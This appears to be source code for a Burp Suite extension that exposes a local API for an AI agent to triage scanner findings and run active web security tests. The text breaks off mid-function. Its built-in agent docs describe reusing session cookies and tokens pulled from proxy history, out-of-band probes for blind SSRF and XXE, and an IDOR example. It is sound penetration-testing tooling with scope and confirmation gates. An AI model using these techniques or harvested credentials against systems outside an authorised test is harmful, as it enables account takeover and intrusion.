# -*- coding: utf-8 -*-
# Burp Suite Python Extension: Double Agent
# Name: two AI agents - one for passive scanning, one for active scanning
# Version: 2.1
# Release Date: 2026-05-29
# License: MIT License
# Build-ID: bb90850f-1d2e-4d12-852e-842527475b37
#
# AI-powered security scanner for Burp Suite
#
# WHAT'S NEW:
# - Flow Analysis: Multi-select requests from proxy history to analyze business logic flows with AI-generated testing recommendations
# - Passive scanning now disabled by default to encourage manual analysis and save tokens
# - Cost guard: Automatic pause at every $5 spent with resume capability
#


from burp import IBurpExtender, IHttpListener, IScannerCheck, IScanIssue, ITab, IContextMenuFactory, IExtensionStateListener
try:
    from burp import IWebSocketListener
    HAS_WEBSOCKET_LISTENER = True
except ImportError:
    HAS_WEBSOCKET_LISTENER = False
try:
    from burp import IScannerListener
    HAS_SCANNER_LISTENER = True
except ImportError:
    HAS_SCANNER_LISTENER = False
from java.io import PrintWriter
from java.awt import BorderLayout, GridBagLayout, GridBagConstraints, Insets, Dimension, Font, Color, FlowLayout
from javax.swing import JPanel, JScrollPane, JTextArea, JTable, JLabel, JSplitPane, BorderFactory, SwingUtilities, JButton, JCheckBox, BoxLayout, Box, JMenuItem, UIManager, JMenu, RowFilter, JComboBox, JTextField
from javax.swing.event import ChangeListener
from javax.swing.table import DefaultTableModel, DefaultTableCellRenderer
from javax.swing.border import TitledBorder
from java.lang import Runnable
from java.util import ArrayList
from java.net import InetSocketAddress, Socket
import json
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import urlparse
import threading
import urllib2
import time
import hashlib
import hmac
import re
import os
import uuid
from datetime import datetime

VALID_SEVERITIES = {
    "critical": "Critical", "crit": "Critical",
    "high": "High", "medium": "Medium", "low": "Low",
    "information": "Information", "informational": "Information",
    "info": "Information", "inform": "Information"
}

def map_confidence(ai_confidence):
    if ai_confidence < 50: return None
    elif ai_confidence < 75: return "Tentative"
    elif ai_confidence < 90: return "Firm"
    else: return "Certain"

# Custom PrintWriter wrapper to capture console output
class ConsolePrintWriter:
    def __init__(self, original_writer, extender_ref):
        self.original = original_writer
        self.extender = extender_ref
    
    def println(self, message):
        self.original.println(message)
        if hasattr(self.extender, 'log_to_console'):
            try:
                self.extender.log_to_console(str(message))
            except:
                pass
    
    def print_(self, message):
        self.original.print_(message)
    
    def write(self, data):
        self.original.write(data)
    
    def flush(self):
        self.original.flush()


class AgentAPIHandler(BaseHTTPRequestHandler):
    """HTTP handler that exposes findings and a work queue for AI Agent to consume.

    Endpoints (all require header 'Authorization: Bearer <token>' unless path is /api/health):
      GET  /api/health                          -> {status, version, queue_size}
      GET  /api/findings                        -> list of findings (summary)
      GET  /api/findings/<id>                   -> full finding detail
      GET  /api/agent/queue                   -> list of queue items (summary)
      GET  /api/agent/queue/<id>              -> full queue item with all findings
      POST /api/agent/queue/<id>/claim        -> mark item as claimed
      POST /api/agent/queue/<id>/release      -> release a claimed item back to pending
      POST /api/agent/queue/<id>/result       -> store tested outcome and evidence
      (Result submission disabled - agent reports back to user in chat)
    """

    def __init__(self, extender, *args, **kwargs):
        self.extender = extender
        BaseHTTPRequestHandler.__init__(self, *args, **kwargs)

    def _send_json(self, status, payload):
        try:
            body = json.dumps(payload, ensure_ascii=True)
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        except Exception as e:
            try:
                self.extender.stderr.println("[AGENT API] Response error: %s" % str(e))
            except:
                pass

    def _read_body(self):
        try:
            content_length = int(self.headers.getheader('Content-Length') or 0)
            if content_length <= 0:
                return {}
            data = self.rfile.read(content_length)
            text = data.decode("utf-8", "replace") if isinstance(data, bytes) else str(data)
            if not text.strip():
                return {}
            return json.loads(text)
        except Exception as e:
            raise Exception("Invalid JSON body: %s" % str(e))

    def _authorized(self):
        token = self.extender.agent_server_token
        if not token:
            return False
        auth = self.headers.getheader('Authorization')
        if not auth:
            return False
        auth = str(auth).strip()
        if not auth.lower().startswith("bearer "):
            return False
        return auth[7:].strip() == token

    def log_message(self, format, *args):
        # Suppress default HTTP server logging
        pass

    def do_GET(self):
        try:
            # Rate limiting: prevent rapid-fire requests
            now = time.time()
            if now - self.extender.agent_api_last_request < self.extender.agent_api_min_interval:
                delay = self.extender.agent_api_min_interval - (now - self.extender.agent_api_last_request)
                self.extender.stdout.println("[AGENT API] Rate limit hit (GET), sleeping %.0fms" % (delay * 1000))
                time.sleep(delay)
            self.extender.agent_api_last_request = time.time()
            
            parsed_url = urlparse.urlparse(self.path)
            path = parsed_url.path
            query = urlparse.parse_qs(parsed_url.query)
            method = "GET"

            # Public endpoint
            if path == "/api/health":
                with self.extender.agent_queue_lock:
                    pending = sum(1 for q in self.extender.agent_queue if q.get("status") == "pending")
                    total = len(self.extender.agent_queue)
                self._send_json(200, {
                    "status": "ok",
                    "version": getattr(self.extender, "VERSION", "2.1"),
                    "queue_size": total,
                    "queue_pending": pending,
                    "docs": "/api/docs"
                })
                return

            # Public: self-describing API docs so any AI Agent session can onboard
            if path == "/api/docs":
                self._send_json(200, self._build_docs())
                return

            # All other endpoints require auth
            if not self._authorized():
                self._send_json(401, {"error": "unauthorized"})
                return

            # Collaborator payload + interaction endpoints (for OOB testing)
            if path == "/api/agent/collaborator/interactions":
                self._handle_get_collaborator_interactions(query)
                return

            if path == "/api/agent/collaborator":
                if self.extender.collaborator is None:
                    self._send_json(503, {"error": "Collaborator not available", "message": "Burp Collaborator is not available in this Burp edition"})
                    return
                try:
                    # generatePayload(boolean includeCollaboratorServerLocation)
                    try:
                        payload = self.extender.collaborator.generatePayload(True)
                    except TypeError:
                        payload = self.extender.collaborator.generatePayload()
                    payload = str(payload)
                    self._send_json(200, {
                        "payload": payload,
                        "location": str(self.extender.collaborator.getCollaboratorServerLocation())
                    })
                    self.extender.stdout.println("[AGENT API] Generated collaborator payload: %s" % payload)
                except Exception as e:
                    self.extender.stdout.println("[COLLABORATOR] generatePayload error: %s" % str(e))
                    self._send_json(500, {"error": "Failed to generate collaborator payload", "message": str(e)})
                return

            if path == "/api/agent/auth/latest":
                self._handle_get_latest_auth(query)
                return
            if path == "/api/agent/preflight":
                self._handle_agent_preflight(query)
                return
            if path == "/api/agent/history/http/regex":
                self._handle_proxy_http_history_regex(query)
                return

            # Route
            if path == "/api/findings" and method == "GET":
                self._handle_list_findings()
            elif path.startswith("/api/findings/"):
                fid = path[len("/api/findings/"):]
                self._handle_get_finding(fid)
            elif path == "/api/agent/queue":
                self._handle_list_queue()
            elif path.startswith("/api/agent/queue/") and path.endswith("/curl"):
                qid = path[len("/api/agent/queue/"):-len("/curl")]
                self._handle_get_queue_curl(qid, query)
            elif path.startswith("/api/agent/queue/"):
                qid = path[len("/api/agent/queue/"):]
                self._handle_get_queue_item(qid)
            elif path == "/api/report":
                self._handle_get_report()
            elif path == "/api/coverage":
                self._handle_get_coverage(query)
            else:
                self._send_json(404, {"error": "not found", "path": path})
        except Exception as e:
            try:
                self.extender.stderr.println("[AGENT API] Handler error: %s" % self._safe_ascii_text(e))
            except:
                pass
            try:
                self._send_json(500, {"error": "internal", "message": str(e)})
            except:
                pass

    def do_POST(self):
        try:
            # Rate limiting: prevent rapid-fire requests
            now = time.time()
            if now - self.extender.agent_api_last_request < self.extender.agent_api_min_interval:
                delay = self.extender.agent_api_min_interval - (now - self.extender.agent_api_last_request)
                self.extender.stdout.println("[AGENT API] Rate limit hit (POST), sleeping %.0fms" % (delay * 1000))
                time.sleep(delay)
            self.extender.agent_api_last_request = time.time()
            
            path = self.path
            method = "POST"

            # All POST endpoints require auth
            if not self._authorized():
                self._send_json(401, {"error": "unauthorized"})
                return

            # Route
            if path == "/api/findings":
                self._handle_create_finding()
            elif path == "/api/agent/queue/clear":
                self._handle_clear_queue()
            elif path.startswith("/api/agent/queue/") and path.endswith("/claim"):
                qid = path[len("/api/agent/queue/"):-len("/claim")]
                self._handle_claim_queue(qid)
            elif path.startswith("/api/agent/queue/") and path.endswith("/release"):
                qid = path[len("/api/agent/queue/"):-len("/release")]
                self._handle_release_queue(qid)
            elif path.startswith("/api/agent/queue/") and path.endswith("/result"):
                qid = path[len("/api/agent/queue/"):-len("/result")]
                self._handle_queue_result(qid)
            elif path.startswith("/api/agent/queue/") and path.endswith("/heartbeat"):
                qid = path[len("/api/agent/queue/"):-len("/heartbeat")]
                self._handle_queue_heartbeat(qid)
            elif path == "/api/findings/triage":
                self._handle_bulk_triage_findings()
            elif path.startswith("/api/findings/") and path.endswith("/triage"):
                fid = path[len("/api/findings/"):-len("/triage")]
                self._handle_triage_finding(fid)
            elif path == "/api/agent/request":
                self._handle_agent_request()
            elif path == "/api/agent/request/http2":
                self._handle_agent_request_http2()
            else:
                self._send_json(404, {"error": "not found", "path": path})
        except Exception as e:
            try:
                self.extender.stderr.println("[AGENT API] Handler error: %s" % str(e))
            except:
                pass
            try:
                self._send_json(500, {"error": "internal", "message": str(e)})
            except:
                pass

    # ---- handlers ----

    def _build_docs(self):
        """Return a self-describing API spec so any AI Agent session can onboard without prior context."""
        return {
            "name": "Double Agent - AI Agent API",
            "version": getattr(self.extender, "VERSION", "2.1"),
            "description": (
                "This API lets an external agentic AI (AI Agent) read security findings from a "
                "Burp Suite extension, claim work items, and run manual security tests. "
                "Finding creation/submission is disabled - the agent reports tested findings directly to the user in chat, "
                "but it may update structured triage status on existing findings. "
                "Work items may include 'browser_verify': true, meaning the user wants the agent to "
                "verify the finding in a real browser using BrowserOS MCP tools (with traffic routed "
                "through Burp proxy at 127.0.0.1:8080). The agent must ask the user in chat before "
                "any state-changing browser action."
            ),
            "auth": {
                "type": "bearer",
                "header": "Authorization: Bearer <token>",
                "public_endpoints": ["/api/health", "/api/docs"]
            },
            "typical_flow": [
                "1. GET /api/health to confirm reachable",
                "2. GET /api/docs to load current endpoint schemas and rules",
                "3. GET /api/agent/preflight?host=<target-host> to verify Burp proxy listener, scope files, queue state, and available auth material before active testing.",
                "4. GET /api/findings and triage the existing findings before testing. Triage means classify and prioritize existing findings from their actual data (URL, title, detail_preview, evidence_preview, CWE/OWASP, request/response availability, and relationships to other findings). Triage is NOT exploitation and NOT title-only sorting.",
                "5. GET /api/agent/queue to list work items, pick one with status=pending, and follow next_action.",
                "6. POST /api/agent/queue/<id>/claim",
                "7. GET /api/agent/queue/<id> for full request/response data and next_action metadata.",
                "8. Check next_action.recommended_transport: browseros means skip curl and use ONLY BrowserOS MCP; curl_proxy means call GET /api/agent/queue/<id>/curl?refresh_auth=true and run the generated command exactly.",
                "9. Run manual tests only on the prioritized set; avoid spending requests/tokens on duplicate or obvious false-positive findings.",
                "10. POST /api/agent/queue/<id>/result with tested outcome, evidence, exact request, status code, response snippet, auth source, Burp history reference if available, and reproduction notes. Completed queue results count toward /api/coverage even when no finding is created.",
                "11. Update triage status in Burp, then report tested results directly to the user (new finding submission to Burp is disabled)"
            ],
            "endpoints": [
                {"method": "GET", "path": "/api/health", "auth": False,
                 "returns": "{status, version, queue_size, queue_pending, docs}"},
                {"method": "GET", "path": "/api/docs", "auth": False,
                 "returns": "this document"},
                {"method": "GET", "path": "/api/report", "auth": True,
                 "description": "Live-rendered findings.md style markdown report derived from current findings_list. Single source of truth - regenerated on every call. Use this instead of asking the user to maintain a separate findings.md file.",
                 "returns": "{markdown, length, generated_at}"},
                {"method": "GET", "path": "/api/coverage?host=<host>&in_scope_only=true&limit=500", "auth": True,
                 "description": "Cross-references Burp's site map with current findings and completed queue results to show which endpoints have been covered vs untested. Endpoints are deduped by (METHOD, host, path) with query strings collapsed. Use this at start-of-session to prioritise WHERE to test next - focus on 'untested' entries that have a response.",
                 "returns": "{totals: {endpoints, covered, untested, coverage_percent}, untested: [{method, host, path, url_example, has_response}], tested: [{method, host, path, coverage_status, finding_count, finding_ids, queue_result_count, queue_result_ids, queue_outcomes}]}"},
                {"method": "GET", "path": "/api/agent/preflight?host=<optional-target-host>", "auth": True,
                 "description": "Start-of-session readiness check. Verifies the local Burp proxy listener on 127.0.0.1:8080, scope/target/findings files, queue counts, and optionally auth/latest for a target host.",
                 "returns": "{status: ok|warn, checks: {burp_proxy_listener, workspace_files, queue, auth_latest?}, warnings, next_steps}"},
                {"method": "GET", "path": "/api/findings", "auth": True,
                 "returns": "{findings: [{id, url, title, severity, confidence, ai_confidence, fp, agent_status, agent_priority, agent_rationale, active_test_recipe, agent_updated_at, discovered_at, cwe, owasp, detail_preview, evidence_preview, has_request_data, has_response_data}], count}"},
                {"method": "POST", "path": "/api/findings", "auth": True,
                 "description": "Create a new finding discovered during agent testing. Sets agent_status=valid by default.",
                 "body": {"url": "required", "title": "required", "severity": "Critical|High|Medium|Low|Information", "confidence": "Certain|Firm|Tentative",
                          "detail": "optional", "cwe": "optional", "evidence": "optional", "remediation": "optional", "owasp": "optional",
                          "ai_confidence": "optional int 0-100", "request_data": "optional", "response_data": "optional",
                          "agent_status": "optional (default: valid)", "agent_priority": "optional (default: P2)", "agent_rationale": "optional",
                          "active_test_recipe": "optional object with hypothesis, active_test_type, mutation_hint, expected signals, max_requests, needs_second_user, safety_notes"},
                 "returns": "{status: created, id, url, title, severity, agent_status, agent_priority, active_test_recipe}"},
                {"method": "GET", "path": "/api/findings/<id>", "auth": True,
                 "returns": "finding object with full detail, evidence, cwe, owasp, remediation, notes"},
                {"method": "POST", "path": "/api/findings/<id>/triage", "auth": True,
                 "description": "Update one finding with the agent's triage verdict. status=duplicate or status=already_covered deletes the finding automatically. duplicate requires a rationale plus duplicate_of or duplicate_evidence_match.",
                 "body": {"status": "valid|false_positive|duplicate|already_covered|not_important|needs_investigation|untouched",
                          "priority": "P1|P2|P3|P4|defer",
                          "rationale": "short reason",
                          "active_test_recipe": "optional updated active-agent handoff object",
                          "duplicate_of": "required for duplicate unless duplicate_evidence_match is supplied",
                          "duplicate_evidence_match": "required for duplicate unless duplicate_of is supplied",
                          "set_fp": "optional bool - also set the existing false-positive flag"}},
                {"method": "POST", "path": "/api/findings/triage", "auth": True,
                 "description": "Bulk update agent triage verdicts for multiple findings. status=duplicate or status=already_covered deletes those findings automatically. duplicate requires rationale plus duplicate_of or duplicate_evidence_match.",
                 "body": {"updates": [{"id": 2, "status": "duplicate", "priority": "defer", "rationale": "same endpoint, parameter, root cause, and evidence as finding 1", "duplicate_of": 1}]}},
                {"method": "GET", "path": "/api/agent/queue", "auth": True,
                 "returns": "{queue: [{id, status, outcome, created_at, claimed_at, completed_at, result_updated_at, findings_count, summary, browser_verify, next_action}], count}"},
                {"method": "GET", "path": "/api/agent/collaborator", "auth": True,
                 "returns": "{payload: 'Burp Collaborator payload string', location: 'collaborator server location'}"},
                {"method": "GET", "path": "/api/agent/collaborator/interactions?payload=<payload>&limit=100", "auth": True,
                 "description": "Poll Burp Collaborator for OOB interactions after injecting a generated payload. Use this to prove blind SSRF, XXE, injection callbacks, webhook calls, and other out-of-band behavior.",
                 "returns": "{payload, count, interactions: [{type, client_ip, time_stamp, interaction_id, request, response, raw_query, ...}], guidance}"},
                {"method": "GET", "path": "/api/agent/auth/latest?host=<host>&limit=50&path_contains=<optional>&include_related=true", "auth": True,
                 "description": "Search recent Burp Proxy history for latest auth material for the target host and related sibling hosts by default. This catches live browser sessions on app hosts when queued work targets an API host. Returns recommended_auth with ready-to-use header lines synthesized from newest usable cookies/tokens. Empty Bearer placeholders are ignored.",
                 "returns": "{host, include_related, related_suffix, searched, recommended_auth: {usable, raw_header_lines, cookie_header, headers, cookies, source_history_indices, source_hosts}, credentials: [{history_index, url, method, host, host_match, request_auth, response_auth}]}"},
                {"method": "GET", "path": "/api/agent/history/http/regex?regex=<pattern>&count=50&offset=0", "auth": True,
                 "description": "Compact regex search over Burp Proxy HTTP history. Returns history handles, URLs, status codes, headers, and previews by default. Use include_request=true or include_response=true only when full bodies are needed.",
                 "returns": "{regex, offset, count, total_matches_seen, history_size, items: [{history_index, method, url, status_code, request_preview, response_preview, request_headers, response_headers}]}"},
                {"method": "GET", "path": "/api/agent/queue/<id>", "auth": True,
                 "returns": "full queue item with findings[] array including active_test_recipe objects (for source=findings), flow_requests[] array (for source=flow_analysis), source field, user_context, browser_verify, next_action, and target_curl preview when curl_proxy is recommended"},
                {"method": "GET", "path": "/api/agent/queue/<id>/curl?refresh_auth=true&step=<optional>", "auth": True,
                 "description": "Generate ready-to-run target curl command(s) for a queue item. Commands always include -x http://127.0.0.1:8080 and X-Double-Agent-Note. With refresh_auth=true, auth/latest is applied automatically and stale captured auth headers are replaced.",
                 "returns": "{queue_id, refresh_auth, proxy_required, commands: [{command, method, url, auth, scope_guard, safety_gate, requires_confirmation, warnings}], usage}"},
                {"method": "POST", "path": "/api/agent/queue/<id>/claim", "auth": True,
                 "body": "none",
                 "returns": "{status: claimed, id, heartbeat_required_within_seconds, heartbeat_url}",
                 "description": "Claims a pending item. Response includes heartbeat timeout - ping /heartbeat before then to keep the claim, or it will be auto-released."},
                {"method": "POST", "path": "/api/agent/queue/<id>/heartbeat", "auth": True,
                 "body": "none",
                 "returns": "{status: ok, id, heartbeat_at, timeout_seconds}",
                 "description": "Refresh the activity timestamp on a claimed item. Call every ~5 minutes during long-running tests to prevent auto-release. Required only for tasks that take longer than the claim timeout (default 15 min)."},
                {"method": "POST", "path": "/api/agent/queue/<id>/release", "auth": True,
                 "description": "Release a claimed work item back to pending when the agent cannot finish it.",
                 "body": {"reason": "optional short reason"},
                 "returns": "{status: pending, id}"},
                {"method": "POST", "path": "/api/agent/queue/<id>/result", "auth": True,
                 "description": "Store durable tested outcome and reproducible evidence for a work item.",
                 "body": {
                     "outcome": "confirmed|not-vulnerable|needs-more-info|inconclusive|failed",
                     "assessment": "short overall assessment",
                     "test_results": [{"title": "test name", "outcome": "confirmed", "detail": "what was tested", "evidence": "key response evidence"}],
                     "evidence": [{"request": "exact HTTP request or curl", "status_code": 200, "response_snippet": "short response proof", "notes": "repro notes"}],
                     "reproduction": "concise reproduction steps",
                     "notes": ["optional notes"]
                 },
                 "returns": "{status: completed|failed, id, outcome}"},
                {"method": "POST", "path": "/api/agent/queue/clear", "auth": True,
                 "description": "Clear terminal queue items after they have been tested. Claimed/in-progress items are preserved.",
                 "body": {"mode": "completed|all - default completed"},
                 "returns": "{status: ok, removed, remaining}"},
                {"method": "POST", "path": "/api/agent/request", "auth": True,
                 "description": "Fallback/convenience path: fire an HTTP request through Burp's HTTP stack and return structured JSON. For normal manual testing, lower token use, and visible Proxy history notes, use native target curl with -x http://127.0.0.1:8080 and X-Double-Agent-Note.",
                 "body": {
                     "host": "required string - hostname only e.g. example.com",
                     "port": "int - default 443",
                     "https": "bool - default true",
                     "request": "required string - full raw HTTP request including headers and body",
                     "comment": "optional Burp history comment, e.g. Agent: IDOR check - baseline owner request",
                     "note": "alias for comment"
                 },
                 "returns": "{status_code: int, headers: [string], body: string}"},
                {"method": "POST", "path": "/api/agent/request/http2", "auth": True,
                 "description": "HTTP/2 execution path. Delegates to the PortSwigger MCP extension on PORTSWIGGER_MCP_URL (default http://127.0.0.1:9876/) using the send_http2_request tool, preserving HTTP/2 pseudo-header semantics.",
                 "body": {
                     "targetHostname": "required hostname, alias host",
                     "targetPort": "int, alias port, default 443",
                     "usesHttps": "bool, alias https, default true",
                     "pseudoHeaders": "object, e.g. {':method':'GET',':path':'/',':scheme':'https',':authority':'example.com'}; if omitted, method/path are used",
                     "headers": "object of ordinary headers",
                     "requestBody": "string body, alias body"
                 },
                 "returns": "{transport: 'portswigger_mcp', mcp_tool: 'send_http2_request', result: <MCP result>}"},
            ],
            "rules": [
                "Only test URLs in the queued findings or the same host.",
                "At startup, list all findings and triage them before testing. Use compact detail/evidence fields, not title alone. Triage is a passive classification pass over existing finding data; do not send new exploit traffic during triage unless the user explicitly asks.",
                "While active in a session, monitor /api/findings every 5 minutes and triage any new, untouched, or changed findings before continuing active testing. Post updates through /api/findings/triage so Burp stays current.",
                "Triage status meanings: valid=likely reportable and worth validating, including real low-risk issues when priority=P4; needs_investigation=plausible but evidence is incomplete; false_positive=not a real security issue or contradicted by evidence; duplicate=same endpoint/parameter/root cause/evidence as another finding and will be deleted automatically; already_covered=same endpoint and technique was already tested or covered by a completed queue result and will be deleted automatically; not_important=false positive, zero-risk, or non-actionable noise and is hidden from normal findings/report views; untouched=not reviewed yet.",
                "Every triage update needs a concrete rationale tied to finding data. Good rationale names the data used: endpoint, parameter, evidence snippet, request/response presence, missing exploitability, or matching duplicate finding.",
                "Mark duplicates with status=duplicate only when root cause, endpoint/parameter, and evidence pattern match; duplicate deletion requires rationale plus duplicate_of or duplicate_evidence_match.",
                "Treat obvious false positives conservatively: explain why they are likely false positives, then deprioritize them unless the user asks for proof.",
                "After triage, update findings through /api/findings/triage so Agent Status, Agent Priority, and Agent Rationale are visible in Burp.",
                "Use active_test_recipe as the active-agent handoff: follow the hypothesis, mutation_hint, expected_vulnerable_signal, expected_safe_signal, max_requests, needs_second_user, and safety_notes before inventing a new plan.",
                "Before testing a queued item, call /api/agent/preflight?host=<target-host>, read findings.md and target.md if present, then follow the item's next_action. If the same endpoint and technique were already tested, report 'already covered' and move on without retesting.",
                "Low severity plus low confidence findings should be deferred unless they are unique, user-requested, or can be confirmed with one or two targeted requests.",
                "Ask the user before destructive actions (password change, account delete, payment, etc).",
                "Before asking the user for fresh auth, call /api/agent/auth/latest for the target host and try recommended_auth.raw_header_lines from Burp history.",
                "Use /api/agent/history/http/regex for compact proxy-history discovery, auth/session recovery, parameter pattern search, and variant analysis before asking the user for more context.",
                "auth/latest searches related sibling hosts by default because live browser sessions are often on an app host while queued requests target an API host. Check recommended_auth.source_hosts.",
                "Live browser sessions are often cookie-based. If recommended_auth has a Cookie header but no Authorization header, retry with the Cookie header before asking the user for tokens.",
                "Never claim that all live sessions are expired just because Authorization Bearer is empty. Empty Bearer placeholders are ignored; check cookies and Set-Cookie material too.",
                "If /api/agent/auth/latest has no usable material but BrowserOS has a live session, refresh the relevant BrowserOS page or navigate once in the same-site app through Burp, then call auth/latest again before asking the user for tokens.",
                "Never guess through multiple login endpoints to acquire auth. Try /api/agent/auth/latest once, optionally retry with one recovered token/cookie set, then ask the user.",
                "MANDATORY CURL RULE: every curl request to a target application must include -x http://127.0.0.1:8080. Local Double Agent API calls to http://127.0.0.1:8777 are exempt. Before running any target curl, check the command and add the proxy flag if missing.",
                "For queue items with next_action.recommended_transport=curl_proxy, call /api/agent/queue/<id>/curl?refresh_auth=true and use the generated command instead of hand-building curl.",
                "If next_action.scope_guard or command scope_guard says requires_confirmation, stop and ask the user before active testing. Never test hosts marked in_scope=false.",
                "If safety_gate.requires_confirmation is true, ask the user before sending the request. This applies to destructive methods and sensitive paths such as payment, password, delete, upload, transfer, or order flows.",
                "For visible Burp Proxy history notes, send tests through the proxy with header X-Double-Agent-Note: Agent: <finding/work item> - <test purpose> - <expected result>. The extension copies it into the Proxy history comment and strips the header before the target sees it.",
                "When using /api/agent/request, always include a short comment/note describing what the request is testing. If the note must be visible in the main Proxy history table, prefer a proxied request with X-Double-Agent-Note.",
                "For HTTP/2-only or HTTP/2-sensitive behavior, use /api/agent/request/http2 so the PortSwigger MCP send_http2_request tool preserves pseudo-headers and protocol semantics.",
                "For blind/OOB test cases, generate a payload with /api/agent/collaborator, inject it safely, then poll /api/agent/collaborator/interactions?payload=<payload> for proof before reporting.",
                "Keep assessment under ~2000 chars; each test_results[*].detail under ~500 chars. Store exact reproducible evidence through /api/agent/queue/<id>/result before reporting in chat.",
                "Valid outcome values: confirmed, not-vulnerable, needs-more-info, inconclusive, failed.",
                "Prioritize: auth bypass > IDOR > business logic > injection > info disclosure."
            ],
            "example_result_body": {
                "outcome": "confirmed",
                "assessment": "Validated IDOR on /api/users/<id>; CSRF protection is working correctly on state-changing endpoints.",
                "test_results": [
                    {"title": "IDOR on GET /api/users/{id}", "outcome": "confirmed",
                     "detail": "Replaced own id 123 with 124; got foreign user profile.",
                     "evidence": "HTTP 200 with email 'alice@example.com'"}
                ],
                "evidence": [
	                    {"request": "GET /api/users/124 HTTP/1.1\nHost: example.com\nCookie: session=...",
	                     "status_code": 200,
	                     "response_snippet": "{\"email\":\"alice@example.com\"}",
	                     "notes": "Same session could read another user's profile.",
	                     "auth_source": "auth/latest source_history_indices=[42]",
	                     "burp_history_ref": "Proxy history comment: Agent: queue #3 - IDOR probe",
	                     "hypothesis": "Changing the path user id should not return another user's profile."}
                ],
                "reproduction": "Claim queue item, replay own profile request with the path id changed to 124, and observe the 200 response.",
                "notes": ["Session uses HS256 JWT; did not test key confusion."]
            }
        }

    def _serialize_finding(self, idx, f, include_full=False):
        # External finding IDs are 1-based for human readability; internal
        # storage stays 0-based (Python list indices). All API endpoints that
        # accept a finding id subtract 1 to map back to the internal index.
        base = {
            "id": idx + 1,
            "url": f.get("url", ""),
            "title": f.get("title", ""),
            "severity": f.get("severity", ""),
            "confidence": f.get("confidence", ""),
            "ai_confidence": f.get("ai_confidence", 0),
            "fp": bool(f.get("fp", False)),
            "agent_status": f.get("agent_status", "untouched"),
            "agent_priority": f.get("agent_priority", ""),
            "agent_rationale": f.get("agent_rationale", ""),
            "active_test_recipe": f.get("active_test_recipe", {}),
            "agent_updated_at": f.get("agent_updated_at", ""),
            "discovered_at": f.get("discovered_at", "")
        }
        if include_full:
            base["detail"] = f.get("detail", "")
            base["evidence"] = f.get("evidence", "")
            base["cwe"] = f.get("cwe", "")
            base["owasp"] = f.get("owasp", "")
            base["remediation"] = f.get("remediation", "")
            base["request_data"] = f.get("request_data", "")
            base["response_data"] = f.get("response_data", "")
            base["notes"] = list(f.get("agent_notes", []))
        else:
            base["cwe"] = f.get("cwe", "")
            base["owasp"] = f.get("owasp", "")
            base["detail_preview"] = self.extender._safe_ascii_text(f.get("detail", ""), 1200)
            base["evidence_preview"] = self.extender._safe_ascii_text(f.get("evidence", ""), 1200)
            base["has_request_data"] = bool(f.get("request_data"))
            base["has_response_data"] = bool(f.get("response_data"))
        return base

    def _handle_list_findings(self):
        with self.extender.findings_lock_ui:
            items = [self._serialize_finding(i, f, include_full=False)
                     for i, f in enumerate(self.extender.findings_list)]
        self._send_json(200, {"findings": items, "count": len(items)})

    def _normalize_agent_status(self, value):
        status = str(value or "untouched").strip().lower().replace(" ", "_").replace("-", "_")
        valid = set(["untouched", "valid", "false_positive", "duplicate", "already_covered",
                     "not_important", "needs_investigation"])
        return status if status in valid else "untouched"

    def _normalize_agent_priority(self, value):
        priority = str(value or "").strip().lower()
        aliases = {"p1": "P1", "p2": "P2", "p3": "P3", "p4": "P4", "defer": "defer", "": ""}
        return aliases.get(priority, "")

    def _duplicate_triage_error(self, body, rationale):
        duplicate_of = str(body.get("duplicate_of", "") or "").strip()
        evidence_match = str(body.get("duplicate_evidence_match", "") or body.get("evidence_match", "") or "").strip()
        if len(rationale.strip()) < 20:
            return "status=duplicate deletes the finding and requires a specific rationale based on actual finding data"
        if not duplicate_of and len(evidence_match) < 20:
            return "status=duplicate requires duplicate_of or duplicate_evidence_match showing matching endpoint/parameter/root cause/evidence"
        return None

    def _triage_status_deletes_finding(self, status):
        return status in ("duplicate", "already_covered")

    def _apply_finding_triage(self, idx, body):
        if idx < 0 or idx >= len(self.extender.findings_list):
            return None

        finding = self.extender.findings_list[idx]
        status = self._normalize_agent_status(body.get("status", finding.get("agent_status", "untouched")))
        priority = self._normalize_agent_priority(body.get("priority", finding.get("agent_priority", "")))
        rationale = str(body.get("rationale", body.get("note", finding.get("agent_rationale", ""))) or "").strip()
        if len(rationale) > 2000:
            rationale = rationale[:2000] + "... [truncated]"

        if self._triage_status_deletes_finding(status):
            if status == "duplicate":
                duplicate_error = self._duplicate_triage_error(body, rationale)
                if duplicate_error:
                    return {
                        "id": idx + 1,
                        "status": "duplicate",
                        "error": duplicate_error,
                        "deleted": False
                    }
            for fp_key in self.extender._get_fp_keys_for_finding(
                finding.get("url", ""), finding.get("title", ""), finding.get("source", "")
            ):
                if fp_key in self.extender.fp_suppressed:
                    self.extender.fp_suppressed.discard(fp_key)
            removed = self.extender.findings_list.pop(idx)
            return {
                "id": idx + 1,
                "status": status,
                "priority": priority,
                "rationale": rationale,
                "fp": bool(removed.get("fp", False)),
                "deleted": True,
                "delete_reason": status,
                "duplicate_of": body.get("duplicate_of", ""),
                "duplicate_evidence_match": body.get("duplicate_evidence_match", body.get("evidence_match", "")),
                "deleted_title": removed.get("title", ""),
                "deleted_url": removed.get("url", ""),
                "internal_index": idx
            }

        finding["agent_status"] = status
        finding["agent_priority"] = priority
        finding["agent_rationale"] = rationale
        if isinstance(body.get("active_test_recipe", None), dict):
            finding["active_test_recipe"] = self.extender._normalize_active_test_recipe(
                body.get("active_test_recipe", {}),
                finding
            )
        finding["agent_updated_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        set_fp = body.get("set_fp", None)
        if set_fp is None and status == "false_positive":
            set_fp = True
        elif set_fp is None and status == "valid":
            set_fp = False
        if set_fp is not None:
            finding["fp"] = bool(set_fp)
            fp_keys = self.extender._get_fp_keys_for_finding(
                finding.get("url", ""), finding.get("title", ""), finding.get("source", "")
            )
            if fp_keys:
                if bool(set_fp):
                    for fp_key in fp_keys:
                        self.extender.fp_suppressed.add(fp_key)
                else:
                    for fp_key in fp_keys:
                        if fp_key in self.extender.fp_suppressed:
                            self.extender.fp_suppressed.discard(fp_key)

        return {
            "id": idx + 1,
            "status": finding.get("agent_status", ""),
            "priority": finding.get("agent_priority", ""),
            "rationale": finding.get("agent_rationale", ""),
            "active_test_recipe": finding.get("active_test_recipe", {}),
            "fp": bool(finding.get("fp", False))
        }

    def _remap_queue_finding_ids_after_delete(self, deleted_indices):
        """Keep queued finding references aligned after deleting findings by index."""
        if not deleted_indices:
